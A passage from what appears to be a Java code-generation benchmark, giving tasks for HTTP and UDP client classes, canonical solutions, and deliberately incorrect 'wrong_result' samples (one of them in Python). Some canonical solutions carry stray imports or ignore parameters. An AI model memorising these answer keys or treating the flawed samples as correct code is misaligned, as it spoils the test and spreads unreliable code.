statusLine.split(\"\\\\s+\");\n        if (parts.length < 1) {\n            return -1;\n        }\n        try {\n            return Integer.parseInt(parts[1]);\n        } catch (NumberFormatException e) {\n            return -1;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 59,
    "Instruction": "Task Description: Create a Java class that provides functionality to read and check the existence of URL-based resources, with support for character encoding.\n\nClass Description: The UrlTemplateResource class is designed to handle URL resources by providing methods to read their content and check their existence. It supports specifying character encoding for proper text reading and handles both regular URL connections and HTTP-specific operations.\n\nAttributes:\n- url: URL - The URL of the resource to be accessed\n- characterEncoding: String - The character encoding to be used when reading the resource (can be null)\n\nMethods:\n- Constructor: UrlTemplateResource(String path, String characterEncoding) -> void - Creates an instance with a URL path string and character encoding\n- Constructor: UrlTemplateResource(URL url, String characterEncoding) -> void - Creates an instance with a URL object and character encoding\n- reader: reader() -> Reader - Returns a Reader for the URL resource with optional character encoding\n- inputStream: inputStream() -> InputStream - Internal method that opens and returns an InputStream for the URL\n- exists: exists() -> boolean - Checks if the URL resource exists by attempting to connect to it",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.Reader;\nimport java.net.HttpURLConnection;\nimport java.net.MalformedURLException;\nimport java.net.URL;\nimport java.net.URLConnection;\n\npublic final class UrlTemplateResource {\n\n    private final URL url;\n    private final String characterEncoding;\n\n    public UrlTemplateResource(final String path, final String characterEncoding) throws MalformedURLException {\n        this.url = new URL(path);\n        this.characterEncoding = characterEncoding;\n    }\n\n    public UrlTemplateResource(final URL url, final String characterEncoding) {\n        this.url = url;\n        this.characterEncoding = characterEncoding;\n    }\n\n    public Reader reader() throws IOException {\n        final InputStream inputStream = inputStream();\n        if (this.characterEncoding != null && !this.characterEncoding.trim().isEmpty()) {\n            return new BufferedReader(new InputStreamReader(new BufferedInputStream(inputStream), this.characterEncoding));\n        }\n        return new BufferedReader(new InputStreamReader(new BufferedInputStream(inputStream)));\n    }\n\n    private InputStream inputStream() throws IOException {\n        final URLConnection connection = this.url.openConnection();\n        if (connection.getClass().getSimpleName().startsWith(\"JNLP\")) {\n            connection.setUseCaches(true);\n        }\n\n        final InputStream inputStream;\n        try {\n            inputStream = connection.getInputStream();\n        } catch (final IOException e) {\n            if (connection instanceof HttpURLConnection) {\n                ((HttpURLConnection) connection).disconnect();\n            }\n            throw e;\n        }\n        return inputStream;\n    }\n\n    public boolean exists() {\n        try {\n            final URLConnection connection = this.url.openConnection();\n            if (connection.getClass().getSimpleName().startsWith(\"JNLP\")) {\n                connection.setUseCaches(true);\n            }\n\n            if (connection instanceof HttpURLConnection) {\n                final HttpURLConnection httpConnection = (HttpURLConnection) connection;\n                httpConnection.setRequestMethod(\"HEAD\");\n                int responseCode = httpConnection.getResponseCode();\n                if (responseCode == HttpURLConnection.HTTP_OK) {\n                    return true;\n                } else if (responseCode == HttpURLConnection.HTTP_NOT_FOUND) {\n                    return false;\n                }\n                if (httpConnection.getContentLength() >= 0) {\n                    return true;\n                }\n                httpConnection.disconnect();\n                return false;\n            }\n\n            if (connection.getContentLength() >= 0) {\n                return true;\n            }\n\n            final InputStream is = inputStream();\n            is.close();\n            return true;\n        } catch (final IOException ignored) {\n            return false;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class UrlTemplateResource {\n    private URL url;\n    private String characterEncoding;\n\n    public UrlTemplateResource(String path, String characterEncoding) throws MalformedURLException {\n        this.url = new URL(path);\n        this.characterEncoding = characterEncoding;\n    }\n\n    public UrlTemplateResource(URL url, String characterEncoding) {\n        this.url = url;\n        this.characterEncoding = characterEncoding;\n    }\n\n    public Reader reader() throws IOException {\n        InputStream inputStream = inputStream();\n        if (characterEncoding != null) {\n            return new InputStreamReader(inputStream, characterEncoding);\n        } else {\n            return new InputStreamReader(inputStream);\n        }\n    }\n\n    private InputStream inputStream() throws IOException {\n        return url.openStream();\n    }\n\n    public boolean exists() {\n        try {\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"HEAD\");\n            int responseCode = connection.getResponseCode();\n            return (responseCode == HttpURLConnection.HTTP_OK || responseCode == HttpURLConnection.HTTP_NOT_FOUND);\n        } catch (IOException e) {\n            return false;\n        }\n    }\n}"
  },
  {
    "Task_id": 590,
    "Instruction": "Task Description: Write a Java function that tests the behavior of a servlet when the client closes the socket early during an HTTP POST request. The function should verify that the servlet properly handles the premature connection closure by detecting an exception and not completing normally.\n\nFunction Description: The function `testServletInputStreamEarlyClose` creates a TCP client socket, sends an HTTP POST request with a large body, and immediately closes the socket before the server can fully process the request. It then verifies that the servlet detected the premature closure through exception handling.\n\nInput: None (The function uses predefined constants and helper classes like `DefaultServer`, `TestHttpClient`, and `EarlyCloseClientServlet`)\n\nOutput: None (The function asserts expected behavior through JUnit assertions. Side effects include socket communication and servlet state changes)",
    "Canonical_solution": "import java.net.Socket;\nimport java.io.OutputStream;\n\npublic void testServletInputStreamEarlyClose() throws Exception {\n    Assume.assumeFalse(DefaultServer.isH2());\n    TestHttpClient client = new TestHttpClient();\n    EarlyCloseClientServlet.reset();\n    try (Socket socket = new Socket()) {\n        socket.connect(DefaultServer.getDefaultServerAddress());\n        try {\n            StringBuilder sb = new StringBuilder();\n            for (int i = 0; i < 10000; ++i) {\n                sb.append(\"hello world\\r\\n\");\n            }\n            String request = \"POST /servletContext/\" + SERVLET + \" HTTP/1.1\\r\\nHost:localhost\\r\\nContent-Length:\" + sb.length() + 100 + \"\\r\\n\\r\\n\" + sb.toString();\n            OutputStream outputStream = socket.getOutputStream();\n\n            outputStream.write(request.getBytes(\"US-ASCII\"));\n            outputStream.flush();\n            socket.close();\n\n            Assert.assertTrue(EarlyCloseClientServlet.getLatch().await(10, TimeUnit.SECONDS));\n            Assert.assertFalse(EarlyCloseClientServlet.isCompletedNormally());\n            Assert.assertTrue(EarlyCloseClientServlet.isExceptionThrown());\n        } finally {\n            client.getConnectionManager().shutdown();\n        }\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\n@Test\npublic void testServletInputStreamEarlyClose() throws Exception {\n    DefaultServer.start();\n    TestHttpClient client = new TestHttpClient();\n    String requestBody = \"large body data\".repeat(1000);\n    client.sendPostRequest(\"http://localhost:8080/earlyClose\", requestBody, true);\n    client.close();\n    DefaultServer.stop();\n    assertTrue(EarlyCloseClientServlet.isExceptionDetected());\n}\n```"
  },
  {
    "Task_id": 599,
    "Instruction": "Task Description: Create a Java class that implements a UDP-based output stream appender for logging purposes, capable of sending log messages to a specified host and port via UDP packets.\n\nClass Description: DropwizardUdpSocketAppender is a specialized OutputStreamAppender that sends log messages over UDP to a remote server. It extends OutputStreamAppender to provide UDP socket functionality while maintaining compatibility with logging frameworks.\n\nAttributes:\n- host: String - The target hostname or IP address where UDP packets should be sent\n- port: int - The target port number on the remote host\n\nMethods:\n- DropwizardUdpSocketAppender(String host, int port) -> None - Constructor that initializes the appender with target host and port information\n- start() -> void - Initializes the output stream and starts the appender (overrides parent method)\n- datagramSocketOutputStream(String host, int port) -> OutputStream - Creates and returns a custom OutputStream implementation that sends data via UDP packets\n\nThe custom OutputStream implementation includes:\n- write(int b) -> void - Throws UnsupportedOperationException as UDP doesn't support byte-level writes\n- write(byte[] b, int off, int len) -> void - Sends the specified bytes as a UDP packet to the configured host and port\n- close() -> void - Closes the underlying DatagramSocket",
    "Canonical_solution": "import ch.qos.logback.core.OutputStreamAppender;\nimport ch.qos.logback.core.spi.DeferredProcessingAware;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\n\npublic class DropwizardUdpSocketAppender<E extends DeferredProcessingAware> extends OutputStreamAppender<E> {\n\n    private final String host;\n    private final int port;\n\n    public DropwizardUdpSocketAppender(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    @Override\n    public void start() {\n        setOutputStream(datagramSocketOutputStream(host, port));\n        super.start();\n    }\n\n    protected OutputStream datagramSocketOutputStream(String host, int port) {\n        try {\n            return new OutputStream() {\n                private final DatagramSocket datagramSocket = new DatagramSocket();\n\n                @Override\n                public void write(int b) throws IOException {\n                    throw new UnsupportedOperationException(\"Datagram doesn't work at byte level\");\n                }\n\n                @Override\n                public void write(byte[] b, int off, int len) throws IOException {\n                    datagramSocket.send(new DatagramPacket(b, off, len, InetAddress.getByName(host), port));\n                }\n\n                @Override\n                public void close() throws IOException {\n                    datagramSocket.close();\n                }\n            };\n        } catch (SocketException e) {\n            throw new IllegalStateException(\"Unable to create a datagram socket\", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "wrong_result": "public class DropwizardUdpSocketAppender extends OutputStreamAppender {\n    private String host;\n    private int port;\n    private DatagramSocket datagramSocket;\n\n    public DropwizardUdpSocketAppender(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    @Override\n    public void start() {\n        try {\n            datagramSocket = new DatagramSocket();\n            setOutputStream(datagramSocketOutputStream(host, port));\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private OutputStream datagramSocketOutputStream(String host, int port) {\n        return new OutputStream() {\n            @Override\n            public void write(int b) throws IOException {\n                throw new UnsupportedOperationException(\"UDP does not support byte-level writes\");\n            }\n\n            @Override\n            public void write(byte[] b, int off, int len) throws IOException {\n                InetAddress address = InetAddress.getByName(host);\n                DatagramPacket packet = new DatagramPacket(b, off, len, address, port);\n                datagramSocket.send(packet);\n            }\n\n            @Override\n            public void close() throws IOException {\n                if (datagramSocket != null) {\n                    datagramSocket.close();\n                }\n            }\n        };\n    }\n}"
  },
  {
    "Task_id": 60,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality for downloading images and handling multipart form data submissions.\n\nClass Description: The HttpClient class provides methods to download images via HTTP POST requests and to construct and send multipart form data (including both text parameters and file attachments) to a server. It handles connection management, request configuration, and response processing.\n\nAttributes:\n- url: String - The target URL for HTTP requests\n- con: HttpURLConnection - The HTTP connection object\n- os: OutputStream - Output stream for writing request data\n- delimiter: String - Boundary delimiter for multipart form data (default \"--\")\n- boundary: String - Unique boundary string for multipart requests (generated with timestamp)\n\nMethods:\n- HttpClient(String url) -> None - Constructor that initializes the client with target URL\n- downloadImage(String imgName) -> byte[] - Downloads an image by sending the image name as a POST parameter and returns the image data as byte array\n- connectForMultipart() -> void - Initializes connection for multipart form data submission\n- addFormPart(String paramName, String value) -> void - Adds a text parameter to multipart form data\n- addFilePart(String paramName, String fileName, byte[] data) -> void - Adds a file attachment to multipart form data\n- finishMultipart() -> void - Finalizes the multipart form data construction\n- getResponse() -> String - Retrieves and returns the server response as a string\n- writeParamData(String paramName, String value) -> void - Internal helper method for writing form parameters",
    "Canonical_solution": "import java.io.ByteArrayOutputStream;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpClient {\n    private String url;\n    private HttpURLConnection con;\n    private OutputStream os;\n    \n    private String delimiter = \"--\";\n    private String boundary =  \"SwA\"+Long.toString(System.currentTimeMillis())+\"SwA\";\n\n    public HttpClient(String url) {        \n        this.url = url;\n    }\n    \n    public byte[] downloadImage(String imgName) {\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        try {\n            HttpURLConnection con = (HttpURLConnection) ( new URL(url)).openConnection();\n            con.setRequestMethod(\"POST\");\n            con.setDoInput(true);\n            con.setDoOutput(true);\n            con.connect();\n            con.getOutputStream().write( (\"name=\" + imgName).getBytes());\n            \n            InputStream is = con.getInputStream();\n            byte[] b = new byte[1024];\n            \n            while ( is.read(b) != -1)\n                baos.write(b);\n            \n            con.disconnect();\n        }\n        catch(Throwable t) {\n            t.printStackTrace();\n        }\n        \n        return baos.toByteArray();\n    }\n\n    public void connectForMultipart() throws Exception {\n        con = (HttpURLConnection) ( new URL(url)).openConnection();\n        con.setRequestMethod(\"POST\");\n        con.setDoInput(true);\n        con.setDoOutput(true);\n        con.setRequestProperty(\"Connection\", \"Keep-Alive\");\n        con.setRequestProperty(\"Content-Type\", \"multipart/form-data; boundary=\" + boundary);\n        con.connect();\n        os = con.getOutputStream();\n    }\n    \n    public void addFormPart(String paramName, String value) throws Exception {\n        writeParamData(paramName, value);\n    }\n    \n    public void addFilePart(String paramName, String fileName, byte[] data) throws Exception {\n        os.write( (delimiter + boundary + \"\\r\\n\").getBytes());\n        os.write( (\"Content-Disposition: form-data; name=\\\"\" + paramName +  \"\\\"; filename=\\\"\" + fileName + \"\\\"\\r\\n\"  ).getBytes());\n        os.write( (\"Content-Type: application/octet-stream\\r\\n\"  ).getBytes());\n        os.write( (\"Content-Transfer-Encoding: binary\\r\\n\"  ).getBytes());\n        os.write(\"\\r\\n\".getBytes());\n   \n        os.write(data);\n        \n        os.write(\"\\r\\n\".getBytes());\n    }\n    \n    public void finishMultipart() throws Exception {\n        os.write( (delimiter + boundary + delimiter + \"\\r\\n\").getBytes());\n    }\n    \n    public String getResponse() throws Exception {\n        InputStream is = con.getInputStream();\n        byte[] b1 = new byte[1024];\n        StringBuffer buffer = new StringBuffer();\n        \n        while ( is.read(b1) != -1)\n            buffer.append(new String(b1));\n        \n        con.disconnect();\n        \n        return buffer.toString();\n    }\n    \n    private void writeParamData(String paramName, String value) throws Exception {\n        os.write( (delimiter + boundary + \"\\r\\n\").getBytes());\n        os.write( \"Content-Type: text/plain\\r\\n\".getBytes());\n        os.write( (\"Content-Disposition: form-data; name=\\\"\" + paramName + \"\\\"\\r\\n\").getBytes());;\n        os.write( (\"\\r\\n\" + value + \"\\r\\n\").getBytes());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpClient {\n    private String url;\n    private HttpURLConnection con;\n    private OutputStream os;\n    private String delimiter = \"--\";\n    private String boundary;\n\n    public HttpClient(String url) {\n        this.url = url;\n        this.boundary = \"===\" + System.currentTimeMillis() + \"===\";\n    }\n\n    public byte[] downloadImage(String imgName) throws Exception {\n        con = (HttpURLConnection) new URL(url).openConnection();\n        con.setRequestMethod(\"POST\");\n        con.setDoOutput(true);\n        con.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n        os = con.getOutputStream();\n        os.write((\"imgName=\" + URLEncoder.encode(imgName, \"UTF-8\")).getBytes());\n        os.flush();\n        os.close();\n\n        int responseCode = con.getResponseCode();\n        if (responseCode == HttpURLConnection.HTTP_OK) {\n            InputStream is = con.getInputStream();\n            ByteArrayOutputStream baos = new ByteArrayOutputStream();\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = is.read(buffer)) != -1) {\n                baos.write(buffer, 0, bytesRead);\n            }\n            return baos.toByteArray();\n        } else {\n            throw new IOException(\"Server returned HTTP response code: \" + responseCode);\n        }\n    }\n\n    public void connectForMultipart() throws Exception {\n        con = (HttpURLConnection) new URL(url).openConnection();\n        con.setRequestMethod(\"POST\");\n        con.setDoOutput(true);\n        con.setRequestProperty(\"Content-Type\", \"multipart/form-data; boundary=\" + boundary);\n        os = con.getOutputStream();\n    }\n\n    public void addFormPart(String paramName, String value) throws IOException {\n        writeParamData(paramName, value);\n    }\n\n    public void addFilePart(String paramName, String fileName, byte[] data) throws IOException {\n        os.write((\"\\r\\n--\" + boundary + \"\\r\\n\").getBytes());\n        os.write((\"Content-Disposition: form-data; name=\\\"\" + paramName + \"\\\"; filename=\\\"\" + fileName + \"\\\"\\r\\n\").getBytes());\n        os.write(\"Content-Type: application/octet-stream\\r\\n\\r\\n\".getBytes());\n        os.write(data);\n        os.write(\"\\r\\n\".getBytes());\n    }\n\n    public void finishMultipart() throws IOException {\n        os.write((\"\\r\\n--\" + boundary + \"--\\r\\n\").getBytes());\n        os.flush();\n        os.close();\n    }\n\n    public String getResponse() throws IOException {\n        int responseCode = con.getResponseCode();\n        if (responseCode == HttpURLConnection.HTTP_OK) {\n            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));\n            String inputLine;\n            StringBuilder response = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                response.append(inputLine);\n            }\n            in.close();\n            return response.toString();\n        } else {\n            BufferedReader in = new BufferedReader(new InputStreamReader(con.getErrorStream()));\n            String inputLine;\n            StringBuilder response = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                response.append(inputLine);\n            }\n            in.close();\n            return response.toString();\n        }\n    }\n\n    private void writeParamData(String paramName, String value) throws IOException {\n        os.write((\"\\r\\n--\" + boundary + \"\\r\\n\").getBytes());\n        os.write((\"Content-Disposition: form-data; name=\\\"\" + paramName + \"\\\"\\r\\n\\r\\n\").getBytes());\n        os.write(value.getBytes());\n        os.write(\"\\r\\n\".getBytes());\n    }\n}"
  },
  {
    "Task_id": 604,
    "Instruction": "Task Description: Implement a UDP client class in Java that can send UDP packets to a specified target address and port, with optional response waiting functionality.\n\nClass Description: The UDPClient class provides functionality to send UDP packets to a network target. It supports both fire-and-forget mode and request-response mode. The class manages its own socket and thread for asynchronous operation, and includes cleanup mechanisms.\n\nAttributes:\n- mUdpSocket: DatagramSocket - The UDP socket used for communication\n- mRunning: boolean - Flag indicating whether the client is currently active\n- mThread: Thread - The thread handling the UDP communication\n\nMethods:\n- sendUDPPacket(String targetAddress, int port, String data, boolean waitResponse, ResponseHandler handler) -> void - \n  Sends a UDP packet to the specified address and port. If waitResponse is true, it will wait for and deliver any response.\n  Parameters:\n    - targetAddress: String - The IP address or hostname of the target\n    - port: int - The destination port number\n    - data: String - The message to send\n    - waitResponse: boolean - Whether to wait for a response\n    - handler: ResponseHandler - Callback interface for handling responses or errors\n\n- stop() -> void - \n  Stops any ongoing UDP communication and cleans up resources. Closes the socket and interrupts the thread if active.\n\n- interface ResponseHandler - \n  Callback interface for handling responses or errors\n  Methods:\n    - onResponse(String response) -> void - Called when a response is received\n    - onError(String errorMessage) -> void - Called when an error occurs",
    "Canonical_solution": "import android.content.SharedPreferences;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.view.View.OnClickListener;\nimport android.widget.Button;\nimport android.widget.CheckBox;\nimport android.widget.EditText;\nimport android.widget.Spinner;\nimport android.widget.Toast;\nimport android.widget.ToggleButton;\n\nimport org.csploit.android.R;\nimport org.csploit.android.core.Plugin;\nimport org.csploit.android.core.System;\nimport org.csploit.android.net.Target;\nimport org.csploit.android.net.Target.Type;\n\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\n\npublic class UDPClient {\n\n    private DatagramSocket mUdpSocket = null;\n    private boolean mRunning = false;\n    private Thread mThread = null;\n\n    public void sendUDPPacket(String targetAddress, int port, String data, boolean waitResponse, final ResponseHandler handler) {\n        if (!mRunning) {\n            mRunning = true;\n\n            mThread = new Thread(new Runnable() {\n                @Override\n                public void run() {\n                    String error = null;\n                    try {\n                        mUdpSocket = new DatagramSocket();\n                        DatagramPacket packet = new DatagramPacket(\n                                data.getBytes(), data.length(),\n                                System.getCurrentTarget().getAddress(), port);\n\n                        mUdpSocket.send(packet);\n\n                        if (waitResponse) {\n                            byte[] buffer = new byte[1024];\n                            DatagramPacket response = new DatagramPacket(buffer, buffer.length);\n                            mUdpSocket.receive(response);\n                            final String responseText = new String(buffer);\n                            handler.onResponse(responseText);\n                        }\n                    } catch (Exception e) {\n                        error = e.getMessage();\n                    } finally {\n                        if (mUdpSocket != null) {\n                            mUdpSocket.close();\n                        }\n                        mRunning = false;\n                        if (error != null) {\n                            handler.onError(error);\n                        }\n                    }\n                }\n            });\n\n            mThread.start();\n        }\n    }\n\n    public void stop() {\n        mRunning = false;\n        try {\n            if (mThread != null && mThread.isAlive()) {\n                if (mUdpSocket != null)\n                    mUdpSocket.close();\n                mThread.interrupt();\n                mThread = null;\n            }\n        } catch (Exception e) {\n            // Ignore\n        }\n    }\n\n    public interface ResponseHandler {\n        void onResponse(String response);\n        void onError(String errorMessage);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "wrong_result": "public class UDPClient {\n    private DatagramSocket mUdpSocket;\n    private boolean mRunning;\n    private Thread mThread;\n\n    public void sendUDPPacket(String targetAddress, int port, String data, boolean waitResponse, ResponseHandler handler) {\n        mRunning = true;\n        mThread = new Thread(() -> {\n            try {\n                InetAddress address = InetAddress.getByName(targetAddress);\n                byte[] sendData = data.getBytes();\n                DatagramPacket sendPacket = new DatagramPacket(sendData, sendData.length, address, port);\n                mUdpSocket = new DatagramSocket();\n                mUdpSocket.send(sendPacket);\n\n                if (waitResponse) {\n                    byte[] receiveData = new byte[1024];\n                    DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n                    mUdpSocket.receive(receivePacket);\n                    String response = new String(receivePacket.getData(), 0, receivePacket.getLength());\n                    handler.onResponse(response);\n                }\n            } catch (Exception e) {\n                handler.onError(e.getMessage());\n            } finally {\n                mRunning = false;\n                if (mUdpSocket != null) {\n                    mUdpSocket.close();\n                }\n            }\n        });\n        mThread.start();\n    }\n\n    public void stop() {\n        mRunning = false;\n        if (mUdpSocket != null) {\n            mUdpSocket.close();\n        }\n        if (mThread != null) {\n            mThread.interrupt();\n        }\n    }\n\n    public interface ResponseHandler {\n        void onResponse(String response);\n        void onError(String errorMessage);\n    }\n}"
  },
  {
    "Task_id": 606,
    "Instruction": "Task Description: Create a Java class for handling UDP communication that can both send and receive datagram packets, with proper socket management and error handling.\n\nClass Description: The UdpCommunicationHandler class provides a wrapper for Java's UDP socket functionality, enabling both sending and receiving of datagram packets. It manages socket lifecycle and provides status checking methods.\n\nAttributes:\n- socket: DatagramSocket - The underlying UDP socket for communication\n- bindAddress: InetSocketAddress - The address and port to which the socket is bound\n\nMethods:\n- UdpCommunicationHandler(String bindIp, int bindPort) -> void - Constructor that initializes and binds the UDP socket to the specified IP and port\n- sendData(byte[] data, String targetIp, int targetPort) -> void - Sends the provided data as a UDP packet to the specified target IP and port\n- receiveData() -> byte[] - Receives incoming UDP packet data and returns it as a byte array\n- close() -> void - Closes the UDP socket if it's open\n- isBound() -> boolean - Returns whether the socket is currently bound to an address\n- isClosed() -> boolean - Returns whether the socket is closed",
    "Canonical_solution": "import java.net.DatagramSocket;\nimport java.net.DatagramPacket;\nimport java.net.InetSocketAddress;\nimport java.net.SocketException;\nimport java.io.IOException;\n\npublic class UdpCommunicationHandler {\n    private DatagramSocket socket;\n    private InetSocketAddress bindAddress;\n\n    public UdpCommunicationHandler(String bindIp, int bindPort) throws SocketException {\n        this.bindAddress = new InetSocketAddress(bindIp, bindPort);\n        this.socket = new DatagramSocket(null);\n        this.socket.bind(this.bindAddress);\n    }\n\n    public void sendData(byte[] data, String targetIp, int targetPort) throws IOException {\n        InetSocketAddress targetAddress = new InetSocketAddress(targetIp, targetPort);\n        DatagramPacket packet = new DatagramPacket(data, data.length, targetAddress);\n        this.socket.send(packet);\n    }\n\n    public byte[] receiveData() throws IOException {\n        byte[] buffer = new byte[800];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        this.socket.receive(packet);\n        return packet.getData();\n    }\n\n    public void close() {\n        if (this.socket != null && !this.socket.isClosed()) {\n            this.socket.close();\n        }\n    }\n\n    public boolean isBound() {\n        return this.socket != null && this.socket.isBound();\n    }\n\n    public boolean isClosed() {\n        return this.socket == null || this.socket.isClosed();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "wrong_result": "public class UdpCommunicationHandler {\n    private DatagramSocket socket;\n    private InetSocketAddress bindAddress;\n\n    public UdpCommunicationHandler(String bindIp, int bindPort) throws IOException {\n        this.bindAddress = new InetSocketAddress(bindIp, bindPort);\n        this.socket = new DatagramSocket(this.bindAddress);\n    }\n\n    public void sendData(byte[] data, String targetIp, int targetPort) throws IOException {\n        InetAddress targetAddress = InetAddress.getByName(targetIp);\n        DatagramPacket packet = new DatagramPacket(data, data.length, targetAddress, targetPort);\n        socket.send(packet);\n    }\n\n    public byte[] receiveData() throws IOException {\n        byte[] buffer = new byte[65535];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        socket.receive(packet);\n        byte[] receivedData = new byte[packet.getLength()];\n        System.arraycopy(buffer, 0, receivedData, 0, receivedData.length);\n        return receivedData;\n    }\n\n    public void close() {\n        if (socket != null && !socket.isClosed()) {\n            socket.close();\n        }\n    }\n\n    public boolean isBound() {\n        return socket != null && socket.isBound();\n    }\n\n    public boolean isClosed() {\n        return socket != null && socket.isClosed();\n    }\n}"
  },
  {
    "Task_id": 609,
    "Instruction": "Task Description: Implement a UDP client function that sends a message to a server and waits for a response.\n\nFunction Description: The function establishes a UDP connection, sends a predefined message (\"hello world\") to a specified server (localhost on port 9876), waits for a response, prints the server's reply, and then closes the connection. This demonstrates basic UDP client-server communication.\n\nInput: None (The target address and port are hardcoded as \"localhost\" and 9876 respectively)\n\nOutput: None (The function prints the server's response to the console but doesn't return any value)",
    "Canonical_solution": "import java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.DatagramPacket;\n\nprivate void sendWifiInfoToClient() throws Exception {\n    DatagramSocket clientSocket = new DatagramSocket();\n    InetAddress IPAddress = InetAddress.getByName(\"localhost\");\n    byte[] sendData = new byte[1024];\n    byte[] receiveData = new byte[1024];\n    String sentence = \"hello world\";\n    sendData = sentence.getBytes();\n    DatagramPacket sendPacket = new DatagramPacket(sendData, sendData.length, IPAddress, 9876);\n    clientSocket.send(sendPacket);\n    DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n    clientSocket.receive(receivePacket);\n    String modifiedSentence = new String(receivePacket.getData());\n    System.out.println(\"FROM SERVER:\" + modifiedSentence);\n    clientSocket.close();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 2,
    "wrong_result": "```python\nimport socket\n\ndef udp_client():\n    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as client_socket:\n        server_address = ('localhost', 9876)\n        message = b'hello world'\n        client_socket.sendto(message, server_address)\n        response, _ = client_socket.recvfrom(1024)\n        print(response.decode())\n```"
  },
  {
    "Task_id": 61,
    "Instruction": "Task Description: Create a Java utility class for making HTTP requests (GET and POST) using HttpURLConnection, with proper error handling and response processing.\n\nClass Description: HttpUtils is a utility class that provides static methods for making HTTP requests. It handles both GET and POST requests, manages connection settings, processes responses, and includes custom error handling for HTTP errors.\n\nAttributes:\n\nError.responseCode: int - The HTTP response code when an error occurs\nError.output: String - The error response body from the server\n\nMethods:\n\npost: post(String request) -> String - Makes a POST request to the specified URL with an empty body\npost: post(String request, String body) -> String - Makes a POST request to the specified URL with the given body\nget: get(String request) -> String - Makes a GET request to the specified URL with default timeout\nget: get(String request, IOUtils.LineRead callback, int timeout) -> String - Makes a GET request to the specified URL with custom timeout and response line callback\nhandleResponse: handleResponse(HttpURLConnection connection, IOUtils.LineRead callback) -> String - Internal method to process the HTTP response\nError.toString: toString() -> String - Returns a string representation of the error including response code and output",
    "Canonical_solution": "import java.io.DataOutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpUtils {\n\n    public static String post(String request) throws Exception {\n        return post(request, \"\");\n    }\n\n    public static String post(String request, String body) throws Exception {\n        URL url = new URL(request);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        try {\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n            connection.setInstanceFollowRedirects(false);\n            connection.setRequestMethod(\"POST\");\n            connection.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n            connection.setRequestProperty(\"charset\", \"utf-8\");\n            connection.setRequestProperty(\"Content-Length\", \"\" + Integer.toString(body.getBytes().length));\n            connection.setUseCaches(false);\n            connection.setConnectTimeout(60000);\n            connection.setReadTimeout(60000);\n            DataOutputStream wr = new DataOutputStream(connection.getOutputStream());\n            try {\n                wr.writeBytes(body);\n                wr.flush();\n            } finally {\n                wr.close();\n            }\n            return handleResponse(connection, null);\n        } finally {\n            connection.disconnect();\n        }\n    }\n\n    public static String get(String request) throws Exception {\n        return get(request, null, 3000);\n    }\n\n    public static String get(String request, IOUtils.LineRead callback, int timeout) throws Exception {\n        URL url = new URL(request);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        try {\n            connection.setInstanceFollowRedirects(false);\n            connection.setRequestMethod(\"GET\");\n            connection.setUseCaches(false);\n            if (timeout > 0) {\n                connection.setConnectTimeout(timeout);\n                connection.setReadTimeout(timeout);\n            }\n            return handleResponse(connection, callback);\n        } finally {\n            connection.disconnect();\n        }\n    }\n\n    private static String handleResponse(HttpURLConnection connection, IOUtils.LineRead callback) throws Exception {\n        int responseCode = connection.getResponseCode();\n        if (responseCode >= 200 && responseCode < 300) {\n            return IOUtils.readAll(connection.getInputStream(), callback);\n        } else {\n            throw new Error(responseCode, IOUtils.readAll(connection.getErrorStream(), callback));\n        }\n    }\n\n    public static class Error extends RuntimeException {\n        public final int responseCode;\n        public final String output;\n\n        public Error(int responseCode, String output) {\n            this.responseCode = responseCode;\n            this.output = output;\n        }\n\n        @Override\n        public String toString() {\n            return \"Error{\" +\n                    \"responseCode=\" + responseCode +\n                    \", output='\" + output + '\\'' +\n                    '}';\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
